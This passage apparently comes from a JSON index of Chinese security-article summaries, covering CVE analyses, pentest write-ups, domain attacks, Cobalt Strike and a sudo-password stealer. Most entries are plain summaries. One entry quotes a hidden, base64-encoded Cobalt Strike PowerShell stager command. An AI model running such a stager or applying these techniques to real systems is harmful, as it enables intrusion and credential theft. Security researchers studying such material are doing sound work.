        "page_content": "该文档分析了 CVE-2017-10271 WebLogic 漏洞，该漏洞允许攻击者通过构造 SOAP 请求触发 XMLDecoder 反序列化，从而在目标服务器上执行任意命令。文档提供了漏洞复现步骤、漏洞分析和利用脚本，并强调了该漏洞的严重性。",
        "FileName": "10172-weblogic漏洞分析之CVE-2017-10271.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2022-0609 恶意样本，该样本利用 Chrome 0day 漏洞。分析表明，该样本收集目标信息，如浏览器版本和操作系统，并根据这些信息判断是否利用漏洞。如果匹配成功，则通过漏洞利用服务器进行攻击。恶意载荷可能托管在请求的 URL 中。",
        "FileName": "11121-对CVE-2022-0609恶意样本的部分分析（chrome在野0day）.pdf"
    },
    {
        "page_content": "本文档详细描述了通过代码审计完成的一次渗透测试，该测试针对某高校进行，通过信息收集、源码分析和漏洞利用，渗透者成功获取了目标网站的shell，并进一步利用内网渗透技术获得了整个校园内网的访问权限。",
        "FileName": "8664-记一次通过代码审计完成的渗透.pdf"
    },
    {
        "page_content": "本文档讨论了在 Windows 11 上运行 Mimikatz 时遇到的问题，特别是 sekurlsa 模块无法正常抓取密码哈希。它分析了问题的原因，并提供了通过修改 Mimikatz 源代码和利用 CVE-2021-36934 漏洞来解决问题的步骤。此外，本文档还介绍了缓解该漏洞的措施，例如删除 VSS 副本。",
        "FileName": "9927-Windows 11上Mimikatz运行的问题以及sekurlsa模块抓取密码哈希原理.pdf"
    },
    {
        "page_content": "**主题：** rakshasa 内网穿透工具使用指南\n\n**内容：** rakshasa 是一款多级代理工具，可用于内网穿透，支持 TCP、socks5 和 http 代理，并可引入外部代理池。该文档介绍了 rakshasa 的功能、版本迭代、编译和使用说明，包括启动本地 socks5 和 http 代理、连接其他节点、远程 shell 等操作。",
        "FileName": "12441-rakshasa内网穿透--win10+Proxifier使用案例.pdf"
    },
    {
        "page_content": "该文档详细介绍了 ThinkPHP 3.2.3 框架中存在的多个漏洞，包括字符串查询注入、数组条件查询注入、table 注入、field 注入、alias 注入、join 注入、union 注入、orderby 注入、group 注入、having 注入、comment 注入、index 注入、query 注入、execute 注入、聚合方法注入、EXP 注入、Action 参数注入、组合注入、模板注入、PHP 标签注入、缓存漏洞和 Widget 扩展注入。这些漏洞允许攻击者执行任意代码、读取敏感信息或修改数据。",
        "FileName": "9326-Thinkphp3漏洞点复现.pdf"
    },
    {
        "page_content": "该文档分析了 WebLogic 漏洞 CVE-2016-0638，重点关注补丁分析和绕过黑名单的技巧。补丁在 InboundMsgAbbrev 和 MsgAbbrevInputStream 类中添加了黑名单检查，但可以通过使用不在黑名单中的 StreamMessageImpl 类来绕过。攻击者利用 StreamMessageImpl 的 writeExternal 方法将恶意 payload 写入 ObjectOutputStream，然后通过 readExternal 方法触发 AnnotationInvocationHandler 的 readObject 方法，从而执行恶意代码。",
        "FileName": "10173-weblogic漏洞分析之CVE-2016-0638.pdf"
    },
    {
        "page_content": "Netflix Conductor 中的漏洞（CVE-2020-9296）允许攻击者通过注入 Java EL 表达式来执行任意代码，该漏洞源于对自定义约束冲突错误消息的不当处理，其中错误信息支持 Java EL 表达式，并且攻击者可控。",
        "FileName": "7889-CVE-2020-9296-Netflix-Conductor-RCE-漏洞分析.pdf"
    },
    {
        "page_content": "本文档探讨了 Java 中 JavaScript 命令执行的攻击和防御策略。它描述了如何通过正则表达式检查来发现命令执行漏洞，以及如何使用黑名单来修复该漏洞。然而，黑名单存在绕过风险，而白名单虽然更安全，但灵活性较差。文档还提供了绕过黑名单的示例代码，并强调了黑名单的局限性。",
        "FileName": "8567-java中js命令执行的攻与防.pdf"
    },
    {
        "page_content": "该文档记录了一次对 www.target.net 网站的渗透测试，测试人员通过信息收集、目录扫描、文件上传、越权访问、SQL 注入、敏感信息泄露等技术，最终成功添加管理员账号并上传 shell，获得了对网站的控制权。",
        "FileName": "10493-某平台的一次简单渗透测试记录.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-8597 漏洞，该漏洞是 pppd 中的一个栈溢出漏洞，影响了 2.4.2 至 2.4.8 版本。该漏洞是由 MD5-Challenge 认证中的长度验证错误引起的，当发送大于 256 字节的用户名时，会导致服务端崩溃。",
        "FileName": "7407-CVE-2020-8597 pppd stack buffer overflow in eap_response.pdf"
    },
    {
        "page_content": "Apache Archiva 2.2.9 以下版本存在任意目录删除（CVE-2022-40309）和任意文件读取（CVE-2022-40308）漏洞，原因是未验证用户输入的目录或文件名，导致攻击者可以通过目录穿越符删除任意目录或读取任意文件。",
        "FileName": "11979-Apache Archiva 任意目录删除(CVE-2022-40309) 和 任意文件读取(CVE-2022-40308).pdf"
    },
    {
        "page_content": "本文探讨了安卓应用程序中代理检测对抗技术，分析了 OSI 七层网络模型，并介绍了代理和 VPN 的工作原理。通过分析应用程序代码，作者提出了绕过代理和 VPN 检测的应对措施，包括使用 Postern 代理、iptables 数据转发和 Burp 透明代理。",
        "FileName": "11398-浅析APP代理检测对抗.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用某产品的0day通用漏洞在众多学校的网站上获取shell权限。通过目录遍历漏洞收集敏感信息，发现学籍号是关键登录凭证，但学籍号权限不足以登录后台。随后，作者发现了一个未授权访问的权限配置页面，可以分配登录权限，从而绕过权限限制。最后，通过上传ashx木马并抓包，成功获取了shell权限。",
        "FileName": "9917-某产品0day通用漏洞getshell众多学校.pdf"
    },
    {
        "page_content": "这篇文档介绍了如何快速定位 .Net 应用程序中的明显漏洞，包括任意文件下载、SQL 注入和任意文件上传。它强调了关注关键对象（如 Inherits 属性）和反汇编 DLL 文件以快速定位代码层的重要性。通过构造有效负载并绕过用户权限验证，攻击者可以利用这些漏洞实现远程代码执行。",
        "FileName": "9481-粗略快速定位程序中明显的漏洞（.Net审计）.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-35215 漏洞，该漏洞影响 SolarWinds Orion 平台，允许远程代码执行。该漏洞源于 ActionPluginBaseView 控件的 .NET 反序列化，该控件允许攻击者通过在 HTTP 请求中提供恶意 JSON 数据来执行任意代码。攻击者可以通过将恶意小工具放入 SwisEntityContext 类的 PropertyBag 字段中来利用此漏洞，从而导致远程代码执行。",
        "FileName": "10413-CVE-2021–35215 SolarWinds Orion Platform ActionPluginBaseView RCE.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021–35217 漏洞，该漏洞存在于 SolarWinds Patch Manager WSAsyncExecuteTasks.aspx 中，允许攻击者通过反序列化 JSON 数据并加载可控控件来执行远程代码。攻击者可以通过构造一个包含恶意有效负载的 JSON 请求来利用此漏洞，从而在目标系统上执行任意代码。",
        "FileName": "10412-CVE-2021–35217 SolarWinds Patch Manager WSAsyncExecuteTasks RCE.pdf"
    },
    {
        "page_content": "该文档分析了 Laravel 5.5 框架中的三个序列化漏洞，这些漏洞允许攻击者通过精心构造的序列化数据执行任意代码。漏洞利用涉及控制特定类的实例，例如 `Illuminate\\Broadcasting\\PendingBroadcast`、`Illuminate\\Notifications\\ChannelManager` 和 `Illuminate\\Validation\\Validator`，并利用这些实例中的魔法方法或回调函数来执行系统命令。",
        "FileName": "9209-laravel5.5-序列化导致rce.pdf"
    },
    {
        "page_content": "该文档介绍了如何通过分析和绕过各种过滤机制来通关 XSS Game，其中涉及了多种技术，如正则表达式、DOM Clobbering、JSFuck 等。",
        "FileName": "12118-XSS Game通关教程.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2022-0847 脏管道漏洞，该漏洞允许攻击者通过修改只读文件来提升权限。文档重点介绍了漏洞的原理、利用条件和限制，以及如何利用该漏洞从 Docker 容器中逃逸。",
        "FileName": "12055-从脏管道(CVE-2022-0847)到docker逃逸.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 Apache Commons SCXML 中的远程代码执行 (RCE) 漏洞，以及如何使用 XXE 和 JAR 协议上传临时文件来触发该漏洞。该漏洞允许攻击者在目标系统上执行任意代码。",
        "FileName": "12382-2023数字中国创新大赛 XxMe Writeup.pdf"
    },
    {
        "page_content": "本文档详细介绍了在渗透过程中从外围打点进入内网后，如何通过横向移动技术拿下更多主机。文中介绍了多种常用的横向移动手法，包括IPC$连接、计划任务、Windows服务、psexec、WMI、DCOM、Pass-the-Hash、Pass-the-Ticket、Pass-the-Key等，并提供了详细的步骤和示例。",
        "FileName": "9744-横向移动的n种姿势.pdf"
    },
    {
        "page_content": "Apache APISIX Dashboard 中存在一个 RCE 漏洞 (CVE-2021-45232)，该漏洞允许未经授权的攻击者通过两个未受保护的 API (/apisix/admin/migrate/export 和 /apisix/admin/migrate/import) 导出和导入配置，从而绕过身份验证并执行任意命令。该漏洞影响 Apache APISIX Dashboard 版本低于 2.10.1，可以通过升级到最新版本来修复。",
        "FileName": "10738-CVE-2021-45232 Apache-apisix-dashboard RCE 分析与思考.pdf"
    },
    {
        "page_content": "该文档记录了作者一天内对三个网站进行渗透测试的过程，通过利用弱密码和漏洞，成功获取了三个网站的shell，但由于系统版本和配置限制，提权操作均以失败告终。作者在渗透过程中遇到了各种困难，包括命令执行函数被禁用、参数限制、文件包含绕过等，但通过不断思考和尝试，最终成功利用文件上传和session文件包含漏洞获取了shell。",
        "FileName": "9283-记一天三个站并失败的提权过程.pdf"
    },
    {
        "page_content": "该文档主要讨论了 SQL 注入的思路拓展，包括常见的注入点、绕过 WAF、快速定位重要数据表、大数据表数据导出、注入读写文件和执行命令等技术。通过这些思路拓展，可以提高 SQL 注入的利用效率，挖掘更多有价值的信息。",
        "FileName": "7919-渗透经验分享之SQL注入思路拓展.pdf"
    },
    {
        "page_content": "\"白加黑\"攻击方法利用了微软 Windows 应用程序加载 DLL 文件的方式，攻击者通过创建恶意 DLL 并通过 LoadLibrary 函数加载它，当目标尝试执行该文件时，恶意 DLL 会在应用程序加载时加载。这种方法可以绕过杀毒软件的检测，因为恶意 DLL 是通过合法应用程序加载的。",
        "FileName": "12376-白加黑的初步探究.pdf"
    },
    {
        "page_content": "该文档详细介绍了域渗透中委派攻击的原理、分类和利用方法，包括非约束委派、约束委派和基于资源的约束委派，并提供了利用这些委派方式进行本地提权和域控接管的具体步骤。",
        "FileName": "11555-域渗透之委派攻击全集.pdf"
    },
    {
        "page_content": "这篇文档详细介绍了如何通过 Android 逆向技术去除应用程序中的广告和解锁游戏关卡。作者通过使用 AndroidKiller、Fiddler、Jadx 和 DDMS 等工具，分析了应用程序的代码和网络流量，并修改了相关代码和数据库，成功地实现了去除广告和解锁关卡的目标。",
        "FileName": "9811-记一次因为无聊引发的逆向（Android逆向）.pdf"
    },
    {
        "page_content": "该文档详细介绍了对目标网站进行渗透测试的过程，包括信息收集、日志包含和会话包含等技术。渗透测试者利用这些技术绕过安全措施，执行任意代码并最终在目标服务器上写入一个 shell。",
        "FileName": "10534-记一次TP测试.pdf"
    },
    {
        "page_content": "该文档详细描述了研究人员如何通过利用 Facebook 子域中的漏洞来入侵 Facebook。研究人员通过模糊测试和分析 JavaScript 文件发现了绕过重定向登录到 SSO 的方法，并利用 /savepassword 端点重置管理员密码。该漏洞允许攻击者访问 Facebook 员工的工作账户，从而可能访问 Facebook 的内部系统。研究人员报告了该漏洞并获得了 7500 美元的赏金。",
        "FileName": "8661-我是如何入侵Facebook 第一部分.pdf"
    },
    {
        "page_content": "该文档分析了 JNDI 注入攻击的原理和利用方式，包括通过 LDAP 和 RMI 协议进行远程类加载、反序列化和本地工厂类利用等三种主要利用方式。文档还详细介绍了 JDK 中针对 JNDI 注入攻击的限制措施，如 com.sun.jndi.ldap.object.trustURLCodebase 和 java.rmi.server.useCodebaseOnly 系统变量，以及这些限制措施在不同 JDK 版本中的演变。",
        "FileName": "10674-JNDI注入分析.pdf"
    },
    {
        "page_content": "Impost3r 是一款 C 语言编写的工具，用于在普通用户权限下窃取 Linux 系统中的 sudo 密码。它通过修改用户 .bashrc 文件，在用户使用 sudo 命令时窃取密码并通过 DNS 协议传输给攻击者。Impost3r 会自动清除痕迹，让被攻击用户难以察觉异常。",
        "FileName": "7863-Impost3r -- 悄悄窃取sudo密码的小偷.pdf"
    },
    {
        "page_content": "**主题：**极致 CMS 漏洞复现\n\n**内容：**文档详细介绍了极致 CMS 1.5 至 1.7 版本中存在的存储型 XSS 和文件上传漏洞。存储型 XSS 漏洞允许攻击者通过标题字段注入恶意脚本，而文件上传漏洞允许攻击者上传 PHP 文件并获得服务器控制权。文档提供了漏洞复现步骤、白盒测试过程和修复建议。",
        "FileName": "7931-极致CMS两处漏洞复现存储xss文件上传Getshell.pdf"
    },
    {
        "page_content": "该文档记录了一次攻防演练中的代码审计过程，通过分析系统功能点、反编译源码和测试请求，发现了任意账户密码重置、默认账户、任意文件上传、任意文件删除和 SQL 注入等漏洞，最终成功攻破系统。",
        "FileName": "12666-记一次攻防演练代码审计.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用各种工具和技术（如Xray、Ueditor、预编译出错的shell）绕过安全措施，在远程桌面服务器上获取管理员权限，并最终通过添加用户帐户登录到内网服务器。",
        "FileName": "8083-实战撸进内网服务器 (Bypass).pdf"
    },
    {
        "page_content": "该文档介绍了如何利用域渗透中的 SeEnableDelegationPrivilege 权限，通过修改组策略文件或使用命令行工具，将此权限授予普通用户，从而获得对域控制器的控制权或维持对域控制器的访问权限。",
        "FileName": "7289-域渗透——SeEnableDelegationPrivilege的利用.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 SQL 注入漏洞，通过分析网站登录界面和 JavaScript 代码，发现 AES 加密配置泄露，从而反推出加密密文，并利用 Python 编写脚本进行解密，最终成功利用 SQL 注入漏洞获取数据库信息。",
        "FileName": "12524-从匆匆的一瞥，到两小时泯灭（SQL注入）.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 Laravel v8.32.1 中的序列化链来实现任意函数执行。它从一个简单的单参数任意函数执行开始，逐步分析了如何构造更复杂的链，最终达到对 eval() 函数的完全可控调用。文档提供了详细的代码示例和图示，展示了如何构造序列化对象以触发特定的方法调用和参数传递。",
        "FileName": "9318-一道CTF题引起的对laravel v8.32.1序列化利用链挖掘.pdf"
    },
    {
        "page_content": "该文档探讨了在站库分离数据库环境中，当无法通过网络访问数据库或没有 Webshell 时，如何将可执行文件（exe）落地到目标系统。它介绍了使用 MySQL 的 `into dumpfile`、`into outfile` 和 `echo` 方法导出 exe 文件，以及使用日志记录和 PowerShell 提取 exe 十六进制代码的方法。该文档还提供了使用 Python 和其他编程语言解码 exe 十六进制代码的技巧，并讨论了每种方法的优点和局限性。",
        "FileName": "10960-关于站库分离数据库不出网落地Exe方式探究-Mysql.pdf"
    },
    {
        "page_content": "该文档详细分析了 CVE-2018-16333 漏洞，该漏洞存在于 tenda_2018-16333 路由器的 Web 服务器中。该漏洞是由 POST 请求中 `ssid` 参数的缓冲区溢出引起的，该参数直接用于 sprintf 调用，导致返回地址被覆盖，从而导致缓冲区溢出。文档提供了漏洞的详细分析、利用方法和补丁程序。",
        "FileName": "10213-tenda_2018-16333详解.pdf"
    },
    {
        "page_content": "Cobalt Strike 4.0 认证及修补过程主要涉及 License.checkLicenseGUI、Authorization、AuthCrypto、SleevedResource 等类，认证过程包括文本压缩、特征头添加、RSA 加密、HMAC 解密、AES 解密等步骤。破解方法理论上不可行，但可通过伪造授权文件绕过认证，具体步骤包括生成 RSA 公私钥、加密数据、替换相关文件、修改 AuthCrypto.load() 中的 MD5 值或使用 hook 技术热替换 Authorization 类。",
        "FileName": "8557-【知识回顾】Cobalt Strike 4.0 认证及修补过程.pdf"
    },
    {
        "page_content": "该文档探讨了利用 GDI 对象（如 Bitmap 和 Palette）在 Windows 操作系统中进行任意地址读写和内核空间访问的技术。它描述了绕过 Microsoft 在不同 Windows 版本中实施的缓解措施的方法，并提供了利用这些技术的代码示例。",
        "FileName": "10588-GDI对象利用.pdf"
    },
    {
        "page_content": "**文档主题：** 分析如下文档并完成以下任务\n\n**文档内容：**\n\n```\n1.登录 Powershell 混淆代码的解码过程 Powershell 混淆代码的解码过程 ⽪卡丘   /  2021-08-12 21:44:57  /  浏览数  3823 微软对⾼版本的 PowerShell 做了些处理，提供了包括 Transciption 、 ScriptBlock 等多种⽅式来记录 PowerShell 的活动⽇志，因 此基于 PowerShell 的攻击需要在运⾏时对其代码进⾏混淆编码。 ⾸先让我们来看⼀下 PowerShell 的 “-EncodedCommand” 参数。 -EncodedCommand Accepts a base64-encoded string version of a command. Use this parameter to submit commands to Windows PowerShell that require complex quotation marks or curly braces. 如 PowerShell 上述的使⽤说明， “EncodedCommand” 是其⼀个命令，旨在对复杂字符串进⾏封装以便 PowerShell 在命令⾏中 进⾏执⾏。你可以利⽤此命令对关键字符串进⾏隐藏，以躲避防护软件的探测。 知⼰知彼   我看下它是如何⽣成的， ###  理解 cs powershell command 直接利⽤ cs ⽣成 powershell command 上线命令。 ⽣成 payload 内容：\n2.powershell\t-nop\t-w\thidden\t-encodedcommand\tJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMAFYAWAA3ADMATwBpAFMAQgBQACsASABQADgASwBQAHEAUgBLAHEAVABXAGUARQBjADAAbQBlADcAVgBWAGkAdwBxAEsAQwBrAG4ARQAzADcAbABVAGEAcABnAFoARQBRAE0ARAB3AGkAQwBRADIALwAzAGYAcgAwAEgATgBaAFcAKwB6ADkAMgA3AFYAKwA3ADUAVwBVAFEANAB6ADMAVAAzAGQAegB6AHoAZAAwADUAaQBVAFgANQBnADgAZABEAEQAWABmAFUASwBGAGkAeABrAE4ASQA4AGQAbgBRAHEATgBVAE8AdQAvADYARwBoAGMAKwBDADEALwBLAHAAWABYAE0ATQBNACsAbgA4ADgARwBUAFQAZgBsAFQARQBQAHIANABDAFIARQBTADAAaQBnAFMALwBpAHkAZAAzAGEARQBRAGUAVQBMAGwAZgBJAC8AQwBKADgAOABuAHMAVQB1AHIAUQB2AEcAUwBDADEASQBTAGgAMQBRADgATwB5AHUAZABGAFYATQB4AGkAOQBDAGEAUABqAEgARQBuAFQAMQA5ADgAaQBqAGYAKwBDAFMAQwBqAFMAbwBQAGMAaABCADAAZgBRADgANQA3AFAASABUAHAAMAA0AGMAaABwAFQAeAB3ADMAdQB0AFIANwBrAGMAUgBkAFMAegBYAEkAZABHAEYAVgBIADQASwBzAHcAMwBOAEsAUQBYAHQAOQBhAFcAWQBpADcAOABLAFoAdwAvADEAWABxA\n3.ANQA3AFAASABUAHAAMAA0AGMAaABwAFQAeAB3ADMAdQB0AFIANwBrAGMAUgBkAFMAegBYAEkAZABHAEYAVgBIADQASwBzAHcAMwBOAEsAUQBYAHQAOQBhAFcAWQBpADcAOABLAFoAdwAvADEAWABxAHUAYgB5AEgAMwBLAEoAWgAxAEUATgA1AEEAUQBEAEkAagArAGQAcgBJAHgAeQBpAFAAbwBHAFkARwByAHMATQByADUAVAAvACsASwBJAHMAUABGADUAZQBQAE4AVwBVAFgASQB6AGUAcQBsAE0AMABzADQAdABTAHIARQBkAGMAdABpADgASQAzAE0AZAA5AHcAawBnAFcAMABVAHQAWQBkAEgAUABxAFIAdgArAGEAMQB1AGMATwBrAFIAbQAxAGEAZQBHADgAVQB6AHUAcwBIADMAOAB2AGkATQBUAEkANwBRAEIARABIAHoANABQAE0AcgBSADUAMABLAG0AVQBZADMAZwBFADIAOABnAEgARABjAGwAVgA0AHkAUABkADcAZQBIAHcAVQB2AHIAeAA2AE0ANAA0AFoAZAB6AHgAYQAwAHgAaQBuAG8AUgArAFkATgBOAHcANwBtAEUAYQAxAFAAbQBMAEUAcABXAE8ANgBCAHIAVgB5AEIATQBmAEgANwBMAEkASQBUAG8AUwBVAHgAeQBFAFQAVAByADYAQQAzAHQANQAvAHAAcABWAHoARgByAHQAdQBGAGUAdwArAC8ASwByAGQAeAA0AHAAQgBrAHgATwA0AHYANgBwAFUAZQBhAHMARQBVAG4AYwA4AEYASwB0AEgAVAB2AHcASwBIAEgAcgBCAG0ANABNADUAQwBPAGMASAA3ADkAKwBRAFMANABUAGYARAB3AFEAVABTADkAOQBLADcAMQBDAFYAVQBKAGYAYQBpAE4ATQBuAEQAdgBpACsANABXAHIAcAA3AE8AeQBoAEcARgBLAEkAcAAzAEwAbgBSADA\n4.ABNADUAQwBPAGMASAA3ADkAKwBRAFMANABUAGYARAB3AFEAVABTADkAOQBLADcAMQBDAFYAVQBKAGYAYQBpAE4ATQBuAEQAdgBpACsANABXAHIAcAA3AE8AeQBoAEcARgBLAEkAcAAzAEwAbgBSADAANgBoADkAMQBtAG8AVgB3AFUAZABuAEUARABjAEQANwBQADgATwBDAGQAaABUAE0AWABIAHYAOAAvAG4AcwBPADEASgBNADYAcgArADEATgBEAGwAUwBlAHUAbwBjAHoAaQBlAGcAeAArAGYAaABZAGUAWgA3ADUARABIADAAcABsAFkATwByAEkAbgBuADMAKwB5AFkAcwBjAGwATgBNAHoAWABmADUANABOAFgAYgBwADIARwBPADEAbQBEAEgAawBPAFAAaABHACsAOAB0ADYAWgAwAGIAVgBMAEMAegB4AHEASgB6AEUARAAvAEsAeQBVAGoAdwB1AFUAZABJAC8AbwBsAEgATgBBAEgAMwA1AFUAVQB6AHkASAB2ACsAcQAyAEQAOAA3AEoARwBNADQAOQBBAHEAKwBBAEUAdQBMADMAegBoAHoATwBzAEYATABXAG0ARQA0ADkAdwBPAC8AdwBEAGoAUQA5AFgAMABPAGEAMABaAFAAMABNAGIAVwB5ADAAKwA3ADUAZQA4ADcAbABqAG8AdQBpAHEAQwByAGMAeABaAEQAbgB1AEMAcQBZAEYATABtAFUAVgBBAFcAWgBSAGMANQB4AFMAWQA2ADUAWAB3AHoATABmADcAdQByAHgAeQA1ADMATQBJAHIANAB5AGQAeQBqACsAQQA2AGsAeAA2ADAANwBQAG8ATwBNAGkAVABHAGMATABzAEEAdwBNAFEATwBLAEgAZQBUAG0AcQBGAFMARgB2AGsATgBvAE8AegBNAGQAKwArAFIAQwArAFYAMQBNAE8AcwBoADEASQBlAFgAQQAwAGgANwBPAEIARwBaAHkAT\n5.QAG8ATwBNAGkAVABHAGMATABzAEEAdwBNAFEATwBLAEgAZQBUAG0AcQBGAFMARgB2AGsATgBvAE8AegBN",
        "FileName": "10007-Powershell混淆代码的解码过程.pdf"
    },
    {
        "page_content": "该文档分析了 Dlink DIR-645 路由器中存在的缓冲区溢出漏洞，该漏洞是由 Roberto Palear 在 2013 年报告的（CVE-2013-7389）。文档重点关注位于 \"hedwig.cgi\" 上的缓冲区溢出，并使用 Qiling 框架和 Ghidra 工具进行分析。通过设置环境变量和触发漏洞，文档展示了如何利用该漏洞，并解释了导致崩溃的根本原因，即 sprintf 函数将用户输入复制到堆栈中，覆盖了先前保存的寄存器值。",
        "FileName": "8156-使用Qiling分析Dlink DIR-645中的缓冲区溢出(part I).pdf"
    },
    {
        "page_content": "本文档介绍了用于提高 Web 安全性的 HTTP 响应头，包括 HTTP 严格传输安全 (HSTS)、HTTP 公钥固定 (HPKP)、Expect-CT、Referrer-Policy、Cache-Control、Expires、X-Frame-Options、X-XSS-Protection、X-Content-Type-Options 和 Content-Security-Policy (CSP)，并提供了示例和配置方法。",
        "FileName": "7202-安全相关HTTP响应头解读、配置、示例与检测.pdf"
    },
    {
        "page_content": "该文档主要讨论了 Java 应用程序中 XSS 漏洞的产生过程和代码分析，重点关注了 request.setAttribute() 方法在共享未经过滤的用户输入到 request 域中的作用，以及如何使用 ESAPI 库来防御 XSS 攻击。",
        "FileName": "8294-Java审计之XSS篇.pdf"
    },
    {
        "page_content": "该文档记录了一次针对模拟诈骗组织靶场的渗透测试，通过信息收集、打点、跳板机权限维持、内网信息收集等步骤，成功获取管理员服务器权限，收集犯罪嫌疑人通讯录、犯罪情节、作案手法，为公安机关抓捕犯罪嫌疑人打下夯实基础。",
        "FileName": "12523-记对一次模拟诈骗组织靶场渗透的实例.pdf"
    },
    {
        "page_content": "该文档主要分析了 Linux 内核栈溢出和堆越界访问漏洞的挖掘和利用，并提供了利用该漏洞提权的完整 exp。",
        "FileName": "11083-ctf中linux 内核态的漏洞挖掘与利用系列.pdf"
    },
    {
        "page_content": "Nodejs Squirrelly 模板引擎存在远程代码执行漏洞（CVE-2021-32819），该漏洞允许攻击者通过请求查询覆盖和控制全局变量 defaultConfig 中的 defaultFilter 属性，从而在目标系统上执行任意代码。",
        "FileName": "9922-Nodejs Squirrelly 模板引擎 RCE（CVE-2021-32819）漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 SCTF 2020 两道 Login Me 预期解的核心技术，包括 CAS 4.x execution 参数反序列化漏洞分析、padding oracle 攻击、socks5 代理、shiro rce 和 shiro bypass acl 等技术，并提供了相应的 POC 和利用思路。",
        "FileName": "7986-SCTF 2020 两道Login Me预期解的核心技术.pdf"
    },
    {
        "page_content": "CVE-2022-0847 “Dirty Pipe” 漏洞复现及简要分析\n\n该漏洞主要发⽣在对管道进⾏数据写⼊时，由于未对原有的   \t pipe_buff er->flags \t   进⾏清空，从⽽导致可以越权对⽂件进⾏写⼊ ；由于这样的漏洞形式类似于 “ 脏⽜ ” （ CVE-2016-5195 ），但更加容 易进⾏利⽤，因此研究⼈员将该漏洞称之为「 Dirty Pipe 」",
        "FileName": "11016-CVE-2022-0847 “Dirty Pipe”漏洞复现及简要分析.pdf"
    },
    {
        "page_content": "本文档探讨了 PHP 中的无参数命令执行 (RCE) 技术，重点介绍了利用 preg_replace、scandir、session_start 和 getallheaders 函数绕过过滤并执行任意命令的方法。",
        "FileName": "10780-无参数命令执行学习.pdf"
    },
    {
        "page_content": "该文档详细记录了利用SSRF漏洞渗透内网，通过Redis未授权访问漏洞反弹shell，建立内网隧道，利用RCE漏洞横向渗透，最终通过伪造Token上线域控的全过程，展示了SSRF漏洞的严重危害性。",
        "FileName": "8193-SSRF--Redis--DC 全过程模拟记录.pdf"
    },
    {
        "page_content": "该文档介绍了 SMB 重放攻击，这是一种通过窃取用户凭证来获取对目标机器访问权限的攻击技术。攻击者通过中间人攻击，在客户端和服务器之间拦截并重放认证请求，从而获得用户的 Net-Ntlmv2 哈希值，并利用它来破解用户密码或进行其他攻击。文档还提供了利用 SMB 重放攻击的实验过程、利用条件和缓解措施。",
        "FileName": "7234-钓鱼配合smb重放攻击.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何渗透天翼安全网关 HG261GS 型号，通过信息泄露和命令执行漏洞，最终成功开启 telnet 登录，并添加了一个 Linux 用户以获得远程访问权限。",
        "FileName": "9046-一次对天翼安全网关的渗透.pdf"
    },
    {
        "page_content": "该文档详细分析了 CC3 和 CC4 攻击中利用动态加载实现攻击的原理。攻击者通过动态加载恶意类，绕过安全检查，执行任意代码。文档深入剖析了攻击链，从入口点到最终执行恶意代码的步骤，并提供了 POC 代码。",
        "FileName": "11923-详解通过动态加载实现攻击的CC3和CC4.pdf"
    },
    {
        "page_content": "CVE-2022-26500 漏洞存在于 Veeam Backup & Replication 中，允许未经身份验证的用户访问内部 API 函数，从而导致上传和执行恶意代码。该漏洞利用了 TCP 9380 服务的鉴权绕过，通过构造特定的 XML 数据流并通过 TCP 传递给服务器，攻击者可以绕过鉴权并执行任意命令，包括上传和复制文件。",
        "FileName": "11041-CVE-2022-26500 Veeam Backup & Replication RCE.pdf"
    },
    {
        "page_content": "本文介绍了如何审计 Java 应用程序中的安全漏洞，重点关注 Struts2 和 SpringMVC 框架。它提供了分步指南，包括确定框架、识别请求处理流程、跟踪代码以查找 SQL 注入和反序列化漏洞，以及利用命名约定和方法跟踪技巧来提高审计效率。",
        "FileName": "9173-java审计-通俗的理解并审出自己的第一个漏洞.pdf"
    },
    {
        "page_content": "该文档记录了一次内部红蓝对抗，详细描述了渗透过程，包括信息收集、漏洞利用、权限提升、横向移动、域内信息收集、凭证窃取和 DCSync，最终获得了域控权限。",
        "FileName": "10223-记一次内部红蓝对抗.pdf"
    },
    {
        "page_content": "本文档介绍了如何通过 DLL 注入和 API 钩取实现消息钩子，具体包括创建 DLL 钩子进程、编写键盘消息处理回调函数、启动和卸载钩子进程等步骤。通过示例代码和调试过程，详细阐述了 DLL 注入和消息钩子的原理和实现方法。",
        "FileName": "11863-DLL注入学习：复现一个简单的消息钩子.pdf"
    },
    {
        "page_content": "本文介绍了在没有源码的情况下与智能合约交互的三种方法：使用 Remix 部署“伪合约”、使用 JavaScript 脚本交互以及直接使用控制台执行命令。这些方法适用于无法获得合约源码的情况，例如 CTF 比赛中。",
        "FileName": "7290-与无源码智能合约交互的三种方式.pdf"
    },
    {
        "page_content": "该文档总结和分析了 WebLogic Coherence 组件中历史反序列化漏洞，重点关注两个利用链架构：基于 ValueExtractor.extract 和基于 ExternalizableHelper。它详细介绍了涉及的接口、类和利用链的各个部分，包括漏洞点、触发点和利用方法。文档还提供了相关 CVE 和参考链接，以供进一步研究。",
        "FileName": "10016-weblogic Coherence 组件漏洞总结分析.pdf"
    },
    {
        "page_content": "EmpireCMS 7.5 及之前版本存在多个漏洞，包括任意代码执行、代码注入、反射型 XSS 和 SQL 注入，这些漏洞允许攻击者上传任意文件、执行任意 PHP 代码、获取敏感信息和修改数据库内容。",
        "FileName": "9733-empirecms漏洞总结.pdf"
    },
    {
        "page_content": "本文探讨了跨域资源共享 (CORS) 攻击，重点关注错误配置的漏洞。它解释了 CORS 机制的运作方式，并提供了攻击思路，包括获取 API 接口信息和利用登录信息。此外，本文还讨论了 CORS 防御策略和高效挖掘 CORS 漏洞的方法，强调了关键判断因素和自动探测技术。",
        "FileName": "7242-浅析CORS攻击及其挖洞思路.pdf"
    },
    {
